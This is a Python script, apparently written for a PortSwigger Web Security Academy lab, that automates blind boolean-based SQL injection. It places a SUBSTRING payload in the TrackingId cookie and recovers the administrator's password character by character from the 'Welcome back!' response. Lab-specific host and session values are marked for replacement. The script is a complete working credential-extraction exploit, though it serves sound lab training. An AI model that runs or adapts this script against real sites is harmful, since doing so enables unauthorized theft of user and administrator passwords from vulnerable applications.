import requests
import string
import urllib.parse as encode
from bs4 import BeautifulSoup

characters, digits, special = list(string.ascii_letters), list(string.digits), list("!\"#$&'()*+,-./:;<=>?@[\]^_`{|}~")

# URL encode all special characters
special[:] = [encode.quote(x) for x in special]

# I took special characters from here: https://owasp.org/www-community/password-special-characters
# And I removed the '%' character as it caused errors on the lab
characters.extend(digits)
characters.extend(special)

# Join the possible characters for the password
print("Using the following characters: \n",characters)

# Create a variable to accumulate the found characters
password = ""

# Function to determine the character of each position.
# It looks for the `Welcome Back` message given the SQL injection payload, altering the query parameters
# To incrementally contruct the password string based on the response
def get_password(index, password, letter, base_url):
    payload = f"'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+1,+{index})+=+'{password + letter}"
    cookie = f"TrackingId=pTt6ceGRiklpVB1E{payload}; session=N7Z2E0h3KJNSfIjHSNwBEkqonJrp50fF" # CHANGE THIS
    headers = { 
        "Host" : "aca31f0f1ee3ab65c19a367000ef00d4.web-security-academy.net", # CHANGE THIS
        "Cookie" : cookie
    }
    # Construct the request and send it
    response = requests.get(f"{base_url}/", headers=headers)
    if response.status_code == 200:
        # Scrape the response for the message
        soup = BeautifulSoup(response.content, 'html.parser')
        #message = soup.find("section", { "class" : "top-links" })
        # If the message is present then return the character
        #if (message.find_all("div", pattern="Welcome back!")):
        if (soup(text="Welcome back!")):
            return letter
        else:
            return ""
    return "Error"

base_url = "https://aca31f0f1ee3ab65c19a367000ef00d4.web-security-academy.net/" # CHANGE THIS

# Substring index
# End variable ends the execution when no character is correct meaning 
# The password is complete
''' The end condition '''

index, end = 1, 0
cont = True

while cont:
    # Iterate the list of possible characters
    print("Testing on index: ", index)
    # If the end is equal to the index
    # That means any of the characters was correct
    end += 1
    for letter in characters:
        #print(letter, index) # This print is useful when debugging
        
        # Try to get a character
        result = get_password(index, password, letter, base_url)
        if (result == "Error"):
            end = index
            print("ERROR: Check that the lab is working or the headers (cookie, session) values are correct")
            break
        if (result):
            # Append the found character
            password += result
            # Augment the substring index
            index += 1
            # Print the progress
            print("FOUND", password)
            # Start again on the next index
            break
    # End condition
    if (index == end):
        cont = False

# The result  
print("Password: ",password)

